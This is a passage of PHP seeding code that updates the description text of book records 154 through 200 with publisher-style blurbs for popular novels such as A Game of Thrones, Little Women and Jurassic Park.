\nThe Lion, the Witch and the Wardrobe
\nNarnia .... a land frozen in eternal winter ... a country waiting to be set free.
\nFour adventurers step through a wardrobe door and into the land of Narnia -- a land enslaved by the power of the White Witch. But when almost all hope is lost, the return of the Great Lion, Aslan, signals a great change ... and a great sacrifice.";
        $book->save();

        $book = Book::find(154);
        $book->description = "A funny, often poignant tale of boy meets girl with a twist: what if one of them couldn't stop slipping in and out of time? Highly original and imaginative, this debut novel raises questions about life, love, and the effects of time on relationships.
\nAudrey Niffenegger’s innovative debut, The Time Traveler’s Wife, is the story of Clare, a beautiful art student, and Henry, an adventuresome librarian, who have known each other since Clare was six and Henry was thirty-six, and were married when Clare was twenty-three and Henry thirty-one. Impossible but true, because Henry is one of the first people diagnosed with Chrono-Displacement Disorder: periodically his genetic clock resets and he finds himself misplaced in time, pulled to moments of emotional gravity in his life, past and future. His disappearances are spontaneous, his experiences unpredictable, alternately harrowing and amusing.
\nThe Time Traveler’s Wife depicts the effects of time travel on Henry and Clare’s marriage and their passionate love for each other as the story unfolds from both points of view. Clare and Henry attempt to live normal lives, pursuing familiar goals—steady jobs, good friends, children of their own. All of this is threatened by something they can neither prevent nor control, making their story intensely moving and entirely unforgettable.";
        $book->save();

        $book = Book::find(155);
        $book->description = "Here is the first volume in George R. R. Martin’s magnificent cycle of novels that includes A Clash of Kings and A Storm of Swords. As a whole, this series comprises a genuine masterpiece of modern fantasy, bringing together the best the genre has to offer. Magic, mystery, intrigue, romance, and adventure fill these pages and transport us to a world unlike any we have ever experienced. Already hailed as a classic, George R. R. Martin’s stunning series is destined to stand as one of the great achievements of imaginative fiction.
\nA GAME OF THRONES
\nLong ago, in a time forgotten, a preternatural event threw the seasons out of balance. In a land where summers can last decades and winters a lifetime, trouble is brewing. The cold is returning, and in the frozen wastes to the north of Winterfell, sinister and supernatural forces are massing beyond the kingdom’s protective Wall. At the center of the conflict lie the Starks of Winterfell, a family as harsh and unyielding as the land they were born to. Sweeping from a land of brutal cold to a distant summertime kingdom of epicurean plenty, here is a tale of lords and ladies, soldiers and sorcerers, assassins and bastards, who come together in a time of grim omens.
\nHere an enigmatic band of warriors bear swords of no human metal; a tribe of fierce wildlings carry men off into madness; a cruel young dragon prince barters his sister to win back his throne; and a determined woman undertakes the most treacherous of journeys. Amid plots and counterplots, tragedy and betrayal, victory and terror, the fate of the Starks, their allies, and their enemies hangs perilously in the balance, as each endeavors to win that deadliest of conflicts: the game of thrones.";
        $book->save();

        $book = Book::find(156);
        $book->description = "Eat, Pray, Love: One Woman's Search for Everything Across Italy, India, and Indonesia Study Guide consists of approx. 57 pages of summaries and analysis on Eat, Pray, Love: One Woman's Search for Everything Across Italy, India, and Indonesia by Elizabeth Gilbert.";
        $book->save();

        $book = Book::find(157);
        $book->description = "Percy Jackson is a good kid, but he can't seem to focus on his schoolwork or control his temper. And lately, being away at boarding school is only getting worse - Percy could have sworn his pre-algebra teacher turned into a monster and tried to kill him. When Percy's mom finds out, she knows it's time that he knew the truth about where he came from, and that he go to the one place he'll be safe. She sends Percy to Camp Half Blood, a summer camp for demigods (on Long Island), where he learns that the father he never knew is Poseidon, God of the Sea. Soon a mystery unfolds and together with his friends—one a satyr and the other the demigod daughter of Athena - Percy sets out on a quest across the United States to reach the gates of the Underworld (located in a recording studio in Hollywood) and prevent a catastrophic war between the gods.";
        $book->save();

        $book = Book::find(158);
        $book->description = "Generations of readers young and old, male and female, have fallen in love with the March sisters of Louisa May Alcott’s most popular and enduring novel, Little Women. Here are talented tomboy and author-to-be Jo, tragically frail Beth, beautiful Meg, and romantic, spoiled Amy, united in their devotion to each other and their struggles to survive in New England during the Civil War.
\nIt is no secret that Alcott based Little Women on her own early life. While her father, the freethinking reformer and abolitionist Bronson Alcott, hobnobbed with such eminent male authors as Emerson, Thoreau, and Hawthorne, Louisa supported herself and her sisters with \"woman’s work,” including sewing, doing laundry, and acting as a domestic servant. But she soon discovered she could make more money writing. Little Women brought her lasting fame and fortune, and far from being the \"girl’s book” her publisher requested, it explores such timeless themes as love and death, war and peace, the conflict between personal ambition and family responsibilities, and the clash of cultures between Europe and America.";
        $book->save();

        $book = Book::find(159);
        $book->description = "Orphaned as a child, Jane has felt an outcast her whole young life. Her courage is tested once again when she arrives at Thornfield Hall, where she has been hired by the brooding, proud Edward Rochester to care for his ward Adèle. Jane finds herself drawn to his troubled yet kind spirit. She falls in love. Hard.
\nBut there is a terrifying secret inside the gloomy, forbidding Thornfield Hall. Is Rochester hiding from Jane? Will Jane be left heartbroken and exiled once again?";
        $book->save();

        $book = Book::find(160);
        $book->description = "Set amid the austere beauty of the North Carolina coast, The Notebook begins with the story of Noah Calhoun, a rural Southerner recently returned from the Second World War. Noah is restoring a plantation home to its former glory, and he is haunted by images of the beautiful girl he met fourteen years earlier, a girl he loved like no other. Unable to find her, yet unwilling to forget the summer they spent together, Noah is content to live with only memories...until she unexpectedly returns to his town to see him once again.
\nLike a puzzle within a puzzle, the story of Noah and Allie is just the beginning. As it unfolds, their tale miraculously becomes something different, with much higher stakes. The result is a deeply moving portrait of love itself, the tender moments and the fundamental changes that affect us all. It is a story of miracles and emotions that will stay with you forever.";
        $book->save();

        $book = Book::find(161);
        $book->description = "Life of Pi is a fantasy adventure novel by Yann Martel published in 2001. The protagonist, Piscine Molitor \"Pi\" Patel, a Tamil boy from Pondicherry, explores issues of spirituality and practicality from an early age. He survives 227 days after a shipwreck while stranded on a boat in the Pacific Ocean with a Bengal tiger named Richard Parker.";
        $book->save();

        $book = Book::find(162);
        $book->description = "An atmospheric, gritty, and compelling novel of star-crossed lovers, set in the circus world circa 1932, by the bestselling author of Riding Lessons.
\nWhen Jacob Jankowski, recently orphaned and suddenly adrift, jumps onto a passing train, he enters a world of freaks, drifters, and misfits, a second-rate circus struggling to survive during the Great Depression, making one-night stands in town after endless town. A veterinary student who almost earned his degree, Jacob is put in charge of caring for the circus menagerie. It is there that he meets Marlena, the beautiful young star of the equestrian act, who is married to August, the charismatic but twisted animal trainer. He also meets Rosie, an elephant who seems untrainable until he discovers a way to reach her.
\nBeautifully written, Water for Elephants is illuminated by a wonderful sense of time and place. It tells a story of a love between two people that overcomes incredible odds in a world in which even love is a luxury that few can afford.";
        $book->save();

        $book = Book::find(163);
        $book->description = "It is 1939. Nazi Germany. The country is holding its breath. Death has never been busier, and will be busier still.
\nBy her brother's graveside, Liesel's life is changed when she picks up a single object, partially hidden in the snow. It is The Gravedigger's Handbook, left behind there by accident, and it is her first act of book thievery. So begins a love affair with books and words, as Liesel, with the help of her accordian-playing foster father, learns to read. Soon she is stealing books from Nazi book-burnings, the mayor's wife's library, wherever there are books to be found.
\nBut these are dangerous times. When Liesel's foster family hides a Jew in their basement, Liesel's world is both opened up, and closed down.
\nIn superbly crafted writing that burns with intensity, award-winning author Markus Zusak has given us one of the most enduring stories of our time.";
        $book->save();

        $book = Book::find(164);
        $book->description = "Guy Montag is a fireman. In his world, where television rules and literature is on the brink of extinction, firemen start fires rather than put them out. His job is to destroy the most illegal of commodities, the printed book, along with the houses in which they are hidden.
\nMontag never questions the destruction and ruin his actions produce, returning each day to his bland life and wife, Mildred, who spends all day with her television 'family'. But then he meets an eccentric young neighbor, Clarisse, who introduces him to a past where people did not live in fear and to a present where one sees the world through the ideas in books instead of the mindless chatter of television.
\nWhen Mildred attempts suicide and Clarisse suddenly disappears, Montag begins to question everything he has ever known.";
        $book->save();

        $book = Book::find(165);
        $book->description = "I knew we were both in mortal danger. Still, in that instant, I felt well. Whole. I could feel my heart racing in my chest, the blood pulsing hot and fast through my veins again. My lungs filled deep with the sweet scent that came off his skin. It was like there had never been any hole in my chest. I was perfect - not healed, but as if there had never been a wound in the first place.
\nFor Bella Swan, there is one thing more important than life itself: Edward Cullen. But being in love with a vampire is even more dangerous than Bella could ever have imagined. Edward has already rescued Bella from the clutches of one evil vampire, but now, as their daring relationship threatens all that is near and dear to them, they realize their troubles may be just beginning...";
        $book->save();

        $book = Book::find(166);
        $book->description = "Shel Silverstein shook the staid world of children's poetry in 1974 with the publication of this collection, and things haven't been the same since. More than four and a half million copies of Where the Sidewalk Ends have been sold, making it the bestselling children's poetry book ever. With this and his other poetry collections (A Light in the Attic and Falling Up), Silverstein reveals his genius for reaching kids with silly words and simple pen-and-ink drawings. What child can resist a poem called \"Dancing Pants\" or \"The Dirtiest Man in the World\"? Each of the 130 poems is funny in a different way, or touching ... or both. Some approach naughtiness or are a bit disgusting to squeamish grown-ups, but that's exactly what kids like best about Silverstein's work. Jim Trelease, author of The New Read-Aloud Handbook, calls this book \"without question, the best-loved collection of poetry for children.\" (Ages 4 to 10) ";
        $book->save();

        $book = Book::find(167);
        $book->description = "When fifteen-year-old Clary Fray heads out to the Pandemonium Club in New York City, she hardly expects to witness a murder― much less a murder committed by three teenagers covered with strange tattoos and brandishing bizarre weapons. Then the body disappears into thin air. It's hard to call the police when the murderers are invisible to everyone else and when there is nothing―not even a smear of blood―to show that a boy has died. Or was he a boy?
\nThis is Clary's first meeting with the Shadowhunters, warriors dedicated to ridding the earth of demons. It's also her first encounter with Jace, a Shadowhunter who looks a little like an angel and acts a lot like a jerk. Within twenty-four hours Clary is pulled into Jace's world with a vengeance when her mother disappears and Clary herself is attacked by a demon. But why would demons be interested in ordinary mundanes like Clary and her mother? And how did Clary suddenly get the Sight? The Shadowhunters would like to know...";
        $book->save();

        $book = Book::find(168);
        $book->description = "As Seattle is ravaged by a string of mysterious killings and a malicious vampire continues her quest for revenge, Bella once again finds herself surrounded by danger. In the midst of it all, she is forced to choose between her love for Edward and her friendship with Jacob - knowing that her decision has the potential to ignite the ageless struggle between vampire and werewolf. With her graduation quickly approaching, Bella has one more decision to make: life or death. But which is which?";
        $book->save();

        $book = Book::find(169);
        $book->description = "One boy...\nOne dragon...\nA world of adventure.
\nWhen Eragon finds a polished blue stone in the forest, he thinks it is the lucky discovery of a poor farm boy; perhaps it will buy his family meat for the winter. But when the stone brings a dragon hatchling, Eragon soon realizes he has stumbled upon a legacy nearly as old as the Empire itself.
\nOvernight his simple life is shattered, and he is thrust into a perilous new world of destiny, magic, and power. With only an ancient sword and tge advice of an old storyteller for guidance, Eragon and the fledgling dragon must navigate the dangerous terrain and dark enemies of an Empire ruled by a king whose evil knows no bounds.
\nCan Eragon take up the mantle of the legendary Dragon Riders? The fate of the Empire may rest in his hands.";
        $book->save();

        $book = Book::find(170);
        $book->description = "Seconds before the Earth is demolished to make way for a galactic freeway, Arthur Dent is plucked off the planet by his friend Ford Prefect, a researcher for the revised edition of The Hitchhiker's Guide to the Galaxy who, for the last fifteen years, has been posing as an out-of-work actor.
\nTogether this dynamic pair begin a journey through space aided by quotes from The Hitchhiker's Guide (\"A towel is about the most massively useful thing an interstellar hitchhiker can have\") and a galaxy-full of fellow travelers: Zaphod Beeblebrox—the two-headed, three-armed ex-hippie and totally out-to-lunch president of the galaxy; Trillian, Zaphod's girlfriend (formally Tricia McMillan), whom Arthur tried to pick up at a cocktail party once upon a time zone; Marvin, a paranoid, brilliant, and chronically depressed robot; Veet Voojagig, a former graduate student who is obsessed with the disappearance of all the ballpoint pens he bought over the years.";
        $book->save();

        $book = Book::find(171);
        $book->description = "Brave New World is a dystopian novel by English author Aldous Huxley, written in 1931 and published in 1932. Largely set in a futuristic World State, inhabited by genetically modified citizens and an intelligence-based social hierarchy, the novel anticipates huge scientific advancements in reproductive technology, sleep-learning, psychological manipulation and classical conditioning that are combined to make a dystopian society which is challenged by only a single individual: the story's protagonist.";
        $book->save();

        $book = Book::find(172);
        $book->description = "To be irrevocably in love with a vampire is both fantasy and nightmare woven into a dangerously heightened reality for Bella Swan. Pulled in one direction by her intense passion for Edward Cullen, and in another by her profound connection to werewolf Jacob Black, she has endured a tumultuous year of temptation, loss, and strife to reach the ultimate turning point. Her imminent choice to either join the dark but seductive world of immortals or to pursue a fully human life has become the thread from which the fates of two tribes hangs.
\nNow that Bella has made her decision, a startling chain of unprecedented events is about to unfold with potentially devastating and unfathomable, consequences. Just when the frayed strands of Bella's life - first discovered in Twilight, then scattered and torn in New Moon and Eclipse - seem ready to heal and knit together, could they be destroyed... forever?";
        $book->save();

        $book = Book::find(173);
        $book->description = "Set in South Carolina in 1964, The Secret Life of Bees tells the story of Lily Owens, whose life has been shaped around the blurred memory of the afternoon her mother was killed. When Lily's fierce-hearted black \"stand-in mother,\" Rosaleen, insults three of the deepest racists in town, Lily decides to spring them both free. They escape to Tiburon, South Carolina--a town that holds the secret to her mother's past. Taken in by an eccentric trio of black beekeeping sisters, Lily is introduced to their mesmerizing world of bees and honey, and the Black Madonna. This is a remarkable novel about divine female power, a story women will share and pass on to their daughters for years to come.";
        $book->save();

        $book = Book::find(174);
        $book->description = "A nineteenth-century boy from a Mississippi River town recounts his adventures as he travels down the river with a runaway slave, encountering a family involved in a feud, two scoundrels pretending to be royalty, and Tom Sawyer's aunt who mistakes him for Tom.";
        $book->save();

        $book = Book::find(175);
        $book->description = "This beloved book by E. B. White, author of Stuart Little and The Trumpet of the Swan, is a classic of children's literature that is \"just about perfect.\" This high-quality paperback features vibrant illustrations colorized by Rosemary Wells!
\nSome Pig. Humble. Radiant. These are the words in Charlotte's Web, high up in Zuckerman's barn. Charlotte's spiderweb tells of her feelings for a little pig named Wilbur, who simply wants a friend. They also express the love of a girl named Fern, who saved Wilbur's life when he was born the runt of his litter.
\nE. B. White's Newbery Honor Book is a tender novel of friendship, love, life, and death that will continue to be enjoyed by generations to come. This edition contains newly color illustrations by Garth Williams, the acclaimed illustrator of E. B. White's Stuart Little and Laura Ingalls Wilder's Little House series, among many other books.";
        $book->save();

        $book = Book::find(176);
        $book->description = "Christopher John Francis Boone knows all the countries of the world and their capitals and every prime number up to 7,057. He relates well to animals but has no understanding of human emotions. He cannot stand to be touched. And he detests the color yellow.
\nAlthough gifted with a superbly logical brain, for fifteen-year-old Christopher everyday interactions and admonishments have little meaning. He lives on patterns, rules, and a diagram kept in his pocket. Then one day, a neighbor's dog, Wellington, is killed and his carefully constructive universe is threatened. Christopher sets out to solve the murder in the style of his favourite (logical) detective, Sherlock Holmes. What follows makes for a novel that is funny, poignant and fascinating in its portrayal of a person whose curse and blessing are a mind that perceives the world entirely literally.";
        $book->save();

        $book = Book::find(177);
        $book->description = "Rachel catches the same commuter train every morning. She knows it will wait at the same signal each time, overlooking a row of back gardens. She’s even started to feel like she knows the people who live in one of the houses. “Jess and Jason,” she calls them. Their life—as she sees it—is perfect. If only Rachel could be that happy. And then she sees something shocking. It’s only a minute until the train moves on, but it’s enough. Now everything’s changed. Now Rachel has a chance to become a part of the lives she’s only watched from afar. Now they’ll see; she’s much more than just the girl on the train...";
        $book->save();

        $book = Book::find(178);
        $book->title = "The Golden Compass";
        $book->description = "Lyra is rushing to the cold, far North, where witch clans and armored bears rule. North, where the Gobblers take the children they steal--including her friend Roger. North, where her fearsome uncle Asriel is trying to build a bridge to a parallel world.
\nCan one small girl make a difference in such great and terrible endeavors? This is Lyra: a savage, a schemer, a liar, and as fierce and true a champion as Roger or Asriel could want--but what Lyra doesn't know is that to help one of them will be to betray the other.";
        $book->save();

        $book = Book::find(179);
        $book->description = "This best-selling Norton Critical Edition is based on the 1847 first edition of the novel. For the Fourth Edition, the editor has collated the 1847 text with several modern editions and has corrected a number of variants, including accidentals. The text is accompanied by entirely new explanatory annotations.
\nNew to the fourth Edition are twelve of Emily Bronte's letters regarding the publication of the 1847 edition of Wuthering Heights as well as the evolution of the 1850 edition, prose and poetry selections by the author, four reviews of the novel, and poetry selections by the author, four reviews of the novel, and Edward Chitham's insightful and informative chronology of the creative process behind the beloved work.
\nFive major critical interpretations of Wuthering Heights are included, three of them new to the Fourth Edition. A Stuart Daley considers the importance of chronology in the novel. J. Hillis Miller examines Wuthering Heights's problems of genre and critical reputation. Sandra M. Gilbert assesses the role of Victorian Christianity plays in the novel, while Martha Nussbaum traces the novel's romanticism. Finally, Lin Haire-Sargeant scrutinizes the role of Heathcliff in film adaptations of Wuthering Heights. ";
        $book->save();

        $book = Book::find(180);
        $book->description = "Anna is not sick, but she might as well be. By age thirteen, she has undergone countless surgeries, transfusions, and shots so that her older sister, Kate, can somehow fight the leukemia that has plagued her since childhood. The product of preimplantation genetic diagnosis, Anna was conceived as a bone marrow match for Kate—a life and a role that she has never challenged... until now. Like most teenagers, Anna is beginning to question who she truly is. But unlike most teenagers, she has always been defined in terms of her sister—and so Anna makes a decision that for most would be unthinkable, a decision that will tear her family apart and have perhaps fatal consequences for the sister she loves.
\nA provocative novel that raises some important ethical issues, My Sister's Keeper is the story of one family's struggle for survival at all human costs and a stunning parable for all time.";
        $book->save();

        $book = Book::find(181);
        $book->description = "Kurt Vonnegut's absurdist classic Slaughterhouse-Five introduces us to Billy Pilgrim, a man who becomes unstuck in time after he is abducted by aliens from the planet Tralfamadore. In a plot-scrambling display of virtuosity, we follow Pilgrim simultaneously through all phases of his life, concentrating on his (and Vonnegut's) shattering experience as an American prisoner of war who witnesses the firebombing of Dresden.
\nSlaughterhouse-Five is not only Vonnegut's most powerful book, it is as important as any written since 1945. Like Catch- 22, it fashions the author's experiences in the Second World War into an eloquent and deeply funny plea against butchery in the service of authority. Slaughterhouse-Five boasts the same imagination, humanity, and gleeful appreciation of the absurd found in Vonnegut's other works, but the book's basis in rock-hard, tragic fact gives it a unique poignancy--and humor.";
        $book->save();

        $book = Book::find(182);
        $book->description = "Margaret Mitchell's monumental epic of the South won a Pulitzer Prize, gave rise to the most popular motion picture of our time, and inspired a sequel that became the fastest selling novel of the century. It is one of the most popular books ever written: more than 28 million copies of the book have been sold in more than 37 countries. Today, more than 60 years after its initial publication, its achievements are unparalleled, and it remains the most revered American saga and the most beloved work by an American writer...";
        $book->save();

        $book = Book::find(183);
        $book->description = "A Thousand Splendid Suns is a breathtaking story set against the volatile events of Afghanistan's last thirty years—from the Soviet invasion to the reign of the Taliban to post-Taliban rebuilding—that puts the violence, fear, hope, and faith of this country in intimate, human terms. It is a tale of two generations of characters brought jarringly together by the tragic sweep of war, where personal lives—the struggle to survive, raise a family, find happiness—are inextricable from the history playing out around them.
\nPropelled by the same storytelling instinct that made The Kite Runner a beloved classic, A Thousand Splendid Suns is at once a remarkable chronicle of three decades of Afghan history and a deeply moving account of family and friendship. It is a striking, heart-wrenching novel of an unforgiving time, an unlikely friendship, and an indestructible love—a stunning accomplishment.";
        $book->save();

        $book = Book::find(184);
        $book->description = "Now in a special edition to mark the twentieth anniversary of a beloved cult classic! Read the #1 New York Times bestselling coming-of-age story that takes a sometimes heartbreaking, often hysterical, and always honest look at high school in all its glory. Also a major motion picture starring Logan Lerman and Emma Watson, The Perks of Being a Wallflower is a funny, touching, and haunting modern classic.
\nThe critically acclaimed debut novel from Stephen Chbosky follows observant “wallflower” Charlie as he charts a course through the strange world between adolescence and adulthood. First dates, family drama, and new friends. Sex, drugs, and The Rocky Horror Picture Show. Devastating loss, young love, and life on the fringes. Caught between trying to live his life and trying to run from it, Charlie must learn to navigate those wild and poignant roller-coaster days known as growing up.
\nA #1 New York Times best seller for more than a year, an American Library Association Best Book for Young Adults (2000) and Best Book for Reluctant Readers (2000), and with millions of copies in print, this novel for teen readers (or “wallflowers” of more-advanced age) will make you laugh, cry, and perhaps feel nostalgic for those moments when you, too, tiptoed onto the dance floor of life. ";
        $book->save();

        $book = Book::find(185);
        $book->description = "One choice can transform you—or it can destroy you. But every choice has consequences, and as unrest surges in the factions all around her, Tris Prior must continue trying to save those she loves—and herself—while grappling with haunting questions of grief and forgiveness, identity and loyalty, politics and love.
\nTris's initiation day should have been marked by celebration and victory with her chosen faction; instead, the day ended with unspeakable horrors. War now looms as conflict between the factions and their ideologies grows. And in times of war, sides must be chosen, secrets will emerge, and choices will become even more irrevocable—and even more powerful. Transformed by her own decisions but also by haunting grief and guilt, radical new discoveries, and shifting relationships, Tris must fully embrace her Divergence, even if she does not know what she may lose by doing so.
\nNew York Times bestselling author Veronica Roth's much-anticipated second book of the dystopian DIVERGENT series is another intoxicating thrill ride of a story, rich with hallmark twists, heartbreaks, romance, and powerful insights about human nature.";
        $book->save();

        $book = Book::find(186);
        $book->description = "Andrew \"Ender\" Wiggin thinks he is playing computer simulated war games; he is, in fact, engaged in something far more desperate. The result of genetic experimentation, Ender may be the military genius Earth desperately needs in a war against an alien enemy seeking to destroy all human life. The only way to find out is to throw Ender into ever harsher training, to chip away and find the diamond inside, or destroy him utterly. Ender Wiggin is six years old when it begins. He will grow up fast.
\nBut Ender is not the only result of the experiment. The war with the Buggers has been raging for a hundred years, and the quest for the perfect general has been underway almost as long. Ender's two older siblings, Peter and Valentine, are every bit as unusual as he is, but in very different ways. While Peter was too uncontrollably violent, Valentine very nearly lacks the capability for violence altogether. Neither was found suitable for the military's purpose. But they are driven by their jealousy of Ender, and by their inbred drive for power. Peter seeks to control the political process, to become a ruler. Valentine's abilities turn more toward the subtle control of the beliefs of commoner and elite alike, through powerfully convincing essays. Hiding their youth and identities behind the anonymity of the computer networks, these two begin working together to shape the destiny of Earth-an Earth that has no future at all if their brother Ender fails.";
        $book->save();

        $book = Book::find(187);
        $book->description = "Frankenstein; or, The Modern Prometheus is a novel written by English author Mary Shelley (1797–1851) that tells the story of Victor Frankenstein, a young scientist who creates a hideous sapient creature in an unorthodox scientific experiment. Shelley started writing the story when she was 18, and the first edition was published anonymously in London on 1 January 1818, when she was 20.[2] Her name first appeared on the second edition, published in 1823. ";
        $book->save();

        $book = Book::find(188);
        $book->description = "Jack Torrance's new job at the Overlook Hotel is the perfect chance for a fresh start. As the off-season caretaker at the atmospheric old hotel, he'll have plenty of time to spend reconnecting with his family and working on his writing. But as the harsh winter weather sets in, the idyllic location feels ever more remote...and more sinister. And the only one to notice the strange and terrible forces gathering around the Overlook is Danny Torrance, a uniquely gifted five-year-old.";
        $book->save();

        $book = Book::find(189);
        $book->description = "Melanie Stryder refuses to fade away. The earth has been invaded by a species that take over the minds of human hosts while leaving their bodies intact. Wanderer, the invading \"soul\" who has been given Melanie's body, didn't expect to find its former tenant refusing to relinquish possession of her mind.
\nAs Melanie fills Wanderer's thoughts with visions of Jared, a human who still lives in hiding, Wanderer begins to yearn for a man she's never met. Reluctant allies, Wanderer and Melanie set off to search for the man they both love.";
        $book->save();

        $book = Book::find(190);
        $book->description = "Before. Miles “Pudge” Halter is done with his safe life at home. His whole life has been one big non-event, and his obsession with famous last words has only made him crave “the Great Perhaps” even more (Francois Rabelais, poet). He heads off to the sometimes crazy and anything-but-boring world of Culver Creek Boarding School, and his life becomes the opposite of safe. Because down the hall is Alaska Young. The gorgeous, clever, funny, sexy, self-destructive, screwed up, and utterly fascinating Alaska Young. She is an event unto herself. She pulls Pudge into her world, launches him into the Great Perhaps, and steals his heart. Then. . . . ";
        $book->save();

        $book = Book::find(192);
        $book->description = "'The more I know of the world, the more am I convinced that I shall never see a man whom I can really love. I require so much!'
\nMarianne Dashwood wears her heart on her sleeve, and when she falls in love with the dashing but unsuitable John Willoughby she ignores her sister Elinor's warning that her impulsive behaviour leaves her open to gossip and innuendo. Meanwhile Elinor, always sensitive to social convention, is struggling to conceal her own romantic disappointment, even from those closest to her. Through their parallel experience of love—and its threatened loss—the sisters learn that sense must mix with sensibility if they are to find personal happiness in a society where status and money govern the rules of love.
\nThis edition includes explanatory notes, textual variants between the first and second editions, and Tony Tanner's introduction to the original Penguin Classic edition. ";
        $book->save();

        $book = Book::find(193);
        $book->description = "Stanley tries to dig up the truth in this inventive and darkly humorous tale of crime and punishment—and redemption.
\nStanley Yelnats is under a curse. A curse that began with his no-good-dirty-rotten- pig-stealing-great-great-grandfather and has since followed generations of Yelnats. Now Stanley has been unjustly sent to a boys' detention center, Camp Green Lake, where the warden makes the boys \"build character\" by spending all day, every day, digging holes: five feet wide and five feet deep. It doesn't take long for Stanley to realize there's more than character improvement going on at Camp Green Lake. The boys are digging holes because the warden is looking for something. Stanley tries to dig up the truth in this inventive and darkly humorous tale of crime and punishment—and redemption.";
        $book->save();

        $book = Book::find(194);
        $book->description = "A delightfully dishy novel about the all-time most impossible boss in the history of impossible bosses.
Andrea Sachs, a small-town girl fresh out of college, lands the job “a million girls would die for.” Hired as the assistant to Miranda Priestly, the high-profile, fabulously successful editor of \"Runway \"magazine, Andrea finds herself in an office that shouts \"Prada! Armani! Versace!\" at every turn, a world populated by impossibly thin, heart-wrenchingly stylish women and beautiful men clad in fine-ribbed turtlenecks and tight leather pants that show off their lifelong dedication to the gym. With breathtaking ease, Miranda can turn each and every one of these hip sophisticates into a scared, whimpering child.
THE DEVIL WEARS PRADA gives a rich and hilarious new meaning to complaints about “The Boss from Hell.” Narrated in Andrea’s smart, refreshingly disarming voice, it traces a deep, dark, devilish view of life at the top only hinted at in gossip columns and over Cosmopolitans at the trendiest cocktail parties. From sending the latest, not-yet-in-stores Harry Potter to Miranda’s children in Paris by private jet, to locating an unnamed antique store where Miranda had at some point admired a vintage dresser, to serving lattes to Miranda at precisely the piping hot temperature she prefers, Andrea is sorely tested each and every day—and often late into the night with orders barked over the phone. She puts up with it all by keeping her eyes on the prize: a recommendation from Miranda that will get Andrea a top job at any magazine of her choosing. As things escalate from the merely unacceptable to the downright outrageous, however, Andrea begins to realize that the job a million girls would die for may just kill her. And even if she survives, she has to decide whether or not the job is worth the price of her soul. ";
        $book->save();

        $book = Book::find(195);
        $book->title = "The Odyssey";
        $book->description = "Sing to me of the man, Muse, the man of twists and turns driven time and again off course, once he had plundered the hallowed heights of Troy.
\nSo begins Robert Fagles' magnificent translation of the Odyssey, which Jasper Griffin in The New York Times Review of Books hails as \"a distinguished achievement.\"
\nIf the Iliad is the world's greatest war epic, then the Odyssey is literature's grandest evocation of everyman's journey though life. Odysseus' reliance on his wit and wiliness for survival in his encounters with divine and natural forces, during his ten-year voyage home to Ithaca after the Trojan War, is at once a timeless human story and an individual test of moral endurance.
\nIn the myths and legends that are retold here, Fagles has captured the energy and poetry of Homer's original in a bold, contemporary idiom, and given us an Odyssey to read aloud, to savor, and to treasure for its sheer lyrical mastery.
\nRenowned classicist Bernard Knox's superb Introduction and textual commentary provide new insights and background information for the general reader and scholar alike, intensifying the strength of Fagles' translation.
\nThis is an Odyssey to delight both the classicist and the public at large, and to captivate a new generation of Homer's students.";
        $book->save();

        $book = Book::find(196);
        $book->description = "À LÉON WERTH
Je demande pardon aux enfants d’avoir dédié ce livre à une grande personne. J’ai une excuse sérieuse : cette grande personne est le meilleur ami que j’ai au monde. J’ai une autre excuse : cette grande personne peut tout comprendre, même les livres pour enfants. J’ai une troisième excuse : cette grande personne habite la France où elle a faim et froid. Elle a bien besoin d’être consolée. Si toutes ces excuses ne suffisent pas, je veux bien dédier ce livre à l’enfant qu’a été autrefois cette grande personne. Toutes les grandes personnes ont d’abord été des enfants. (Mais peu d’entre elles s’en souviennent.) Je corrige donc ma dédicace :
À LÉON WERTH
QUAND IL ÉTAIT PETIT GARÇON";
        $book->save();

        $book = Book::find(197);
        $book->description = "A tender, moving tale of unconditional love in a family that, despite its profound flaws, gave the author the fiery determination to carve out a successful life on her own terms.
\nJeannette Walls grew up with parents whose ideals and stubborn nonconformity were both their curse and their salvation. Rex and Rose Mary Walls had four children. In the beginning, they lived like nomads, moving among Southwest desert towns, camping in the mountains. Rex was a charismatic, brilliant man who, when sober, captured his children's imagination, teaching them physics, geology, and above all, how to embrace life fearlessly. Rose Mary, who painted and wrote and couldn't stand the responsibility of providing for her family, called herself an \"excitement addict.\" Cooking a meal that would be consumed in fifteen minutes had no appeal when she could make a painting that might last forever.
\nLater, when the money ran out, or the romance of the wandering life faded, the Walls retreated to the dismal West Virginia mining town -- and the family -- Rex Walls had done everything he could to escape. He drank. He stole the grocery money and disappeared for days. As the dysfunction of the family escalated, Jeannette and her brother and sisters had to fend for themselves, supporting one another as they weathered their parents' betrayals and, finally, found the resources and will to leave home.
\nWhat is so astonishing about Jeannette Walls is not just that she had the guts and tenacity and intelligence to get out, but that she describes her parents with such deep affection and generosity. Hers is a story of triumph against all odds, but also a tender, moving tale of unconditional love in a family that despite its profound flaws gave her the fiery determination to carve out a successful life on her own terms.
\nFor two decades, Jeannette Walls hid her roots. Now she tells her own story.";
        $book->save();

        $book = Book::find(198);
        $book->description = "In April, 1992, a young man from a well-to-do family hitchhiked to Alaska and walked alone into the wilderness north of Mt. McKinley. His name was Christopher Johnson McCandless. He had given $25,000 in savings to charity, abandoned his car and most of his possessions, burned all the cash in his wallet, and invented a new life for himself. Four months later, a party of moose hunters found his decomposed body. How McCandless came to die is the unforgettable story of Into the Wild.
\nImmediately after graduating from college in 1991, McCandless had roamed through the West and Southwest on a vision quest like those made by his heroes Jack London and John Muir. In the Mojave Desert he abandoned his car, stripped it of its license plates, and burned all of his cash. He would give himself a new name, Alexander Supertramp, and, unencumbered by money and belongings, he would be free to wallow in the raw, unfiltered experiences that nature presented. Craving a blank spot on the map, McCandless simply threw away the maps. Leaving behind his desperate parents and sister, he vanished into the wild.";
        $book->save();

        $book = Book::find(199);
        $book->description = "After eighteen years as a political prisoner in the Bastille, the ageing Doctor Manette is finally released and reunited with his daughter in England. There the lives of two very different men, Charles Darnay, an exiled French aristocrat, and Sydney Carton, a disreputable but brilliant English lawyer, become enmeshed through their love for Lucie Manette. From the tranquil roads of London, they are drawn against their will to the vengeful, bloodstained streets of Paris at the height of the Reign of Terror, and they soon fall under the lethal shadow of La Guillotine.";
        $book->save();

        $book = Book::find(200);
        $book->description = "An astonishing technique for recovering and cloning dinosaur DNA has been discovered. Now humankind’s most thrilling fantasies have come true. Creatures extinct for eons roam Jurassic Park with their awesome presence and profound mystery, and all the world can visit them—for a price.
\nUntil something goes wrong. . . .
